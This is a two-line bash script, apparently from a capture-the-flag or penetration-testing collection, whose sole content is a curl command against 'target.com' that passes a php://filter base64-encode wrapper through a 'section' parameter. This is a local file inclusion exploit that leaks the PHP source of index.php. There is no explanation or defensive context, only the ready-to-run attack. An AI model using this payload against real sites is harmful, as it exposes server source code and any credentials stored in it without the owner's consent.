#!/usr/bin/env bash

curl target.com/index.php?section=php://filter/convert.base64-encode/resource=index

